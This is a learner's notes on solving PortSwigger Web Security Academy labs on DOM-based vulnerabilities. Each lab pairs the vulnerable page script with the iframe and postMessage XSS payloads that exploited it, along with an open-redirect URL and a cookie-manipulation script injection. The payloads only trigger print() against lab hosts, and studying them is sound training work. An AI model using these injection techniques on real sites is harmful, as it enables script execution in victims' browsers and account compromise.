<span style="color:yellow;font-weight:700;font-size:30px">
DOM-based vulnerabilities (general)

</span>
https://portswigger.net/web-security/dom-based

material:

**Controlling the web message source**

https://portswigger.net/web-security/dom-based/controlling-the-web-message-source

<!-- # materials: what is window.postmessage():

https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage -->

**Controlling the web message source (3 labs)**

https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
#
# ***1. Lab: DOM XSS using web messages***
https://0a85009c04059966c0d325d100d6002c.web-security-academy.net/

hint:
```htm
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```

1. look for messages listners / innerHTML object - find in response to home (GET / HTTP/1.1):
```htm
    <script>
        window.addEventListener('message', function(e) {
            document.getElementById('ads').innerHTML = e.data;
        })
    </script>
```

2. load the hinted code with labs url and **\<img>** tag based onerror event handler:
```htm
<iframe src="https://0a85009c04059966c0d325d100d6002c.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print(1)>','*')">
```
avoid apos char at: src='x' and onerror='print()'. they break the payload here

# DOMed!


# ***2.  Lab: DOM XSS using web messages and a JavaScript URL*** 
https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url

look for vulnarble JS functions by finding script>tag in responses:
find:
```htm
    <script>
        window.addEventListener('message', function(e) {
            var url = e.data;
            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                location.href = url;
            }
        }, false);
    </script>
```

so payload must start with 'http:' or 'https:' to be executed. lets try to pass arbitary url with hashed payload:

possible payloads:
```htm
<iframe src="https://0aab0039049cb659c0c402b200f800de.web-security-academy.net" onload="this.contentWindow.postMessage('javascript:print()<!--http:','*')">

<iframe src="https://0aab0039049cb659c0c402b200f800de.web-security-academy.net" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
```
<!-- 
learned: use javascript: pseudo protocol in urls
https://brutelogic.com.br/blog/alternative-javascript-pseudo-protocol/ -->


# DOMed!

# ***3.  Lab: DOM XSS using web messages and JSON.parse*** 
https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse

look for vulnarble script> tags at proxie - find:
```htm
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```
from 3 possible actions: **scroll**, **load** and **change style**. lets try load as a possible vector.
jason:
```htm
{"type":"load-channel", "data":"javascript:print()//"}
```
```htm
<iframe src="https://0a2500af039e943bc0f65f0c0025000f.web-security-academy.net" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\":\"javascript:print()\"}","*")'>
```
<!-- 
**learned:**
d.url == field name is url (not "data" you dummy)
escape the " in the jason to avoid breaking the outer iframe shell -->

# DUDE!


# DOM-based open redirection (1 lab)
https://portswigger.net/web-security/dom-based/open-redirection

# ***1.  Lab: DOM-based open redirection*** 
https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection

look for keyword url in response - find in post pages (GET /post?postId=1 HTTP/1.1):
```htm
<div class="is-linkback">
    <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
</div>
```

**portswigger solution:**
https://your-lab-id.web-security-academy.net/post?postId=4&url=https://your-exploit-server-id.web-security-academy.net/

**payload:**
https://0ad300bc03e07eacc1b32b24000900f0.web-security-academy.net/post?postId=1&url=https://exploit-0ab1006e03af7ee6c1892b8c011f001f.web-security-academy.net/exploit

(of course in the exploit page needs to be a badass maliciouse code)
#

# DOM-based cookie manipulation (1 lab)
https://portswigger.net/web-security/dom-based/cookie-manipulation


# ***1.  Lab: DOM-based cookie manipulation*** 
https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation

hint:
document.cookie = 'cookieName='+location.hash.slice(1);

serach keyword cookie to find cookie related vulnarbilties - find in page (GET /product?productId=3 HTTP/1.1)
```htm
<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

this script creates a link to our last seen product
```htm
<script>
    document.cookie = 'lastViewedProduct=' + location.hash.slice(1) + '; SameSite=None; Secure'
</script>
```

portswigger solution:
```htm
<iframe src="https://your-lab-id.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://your-lab-id.web-security-academy.net';window.x=1;">
```

<!-- i guess the onload works as follow:
check if window.x (arbitary var?) has valiue and if he does we redirect iframe to the second url value; after we load the window.x with value to make sure it resualts to true to fire the onload handler.

not sure why window.x only being loaded in the end
not sure why use the if clause and not redirect otherwise

but still - supercool -->

payload:
```htm
<iframe src="https://0a900063030848c7c03f08790046001e.web-security-academy.net/product?productId=3&'><script>print()</script>" onload="if(!window.x)this.src='https://0a900063030848c7c03f08790046001e.web-security-academy.net';window.x=1">
```

# DOMed!


# DOM-based XSS
https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data

**did them without write up - to complete in future**
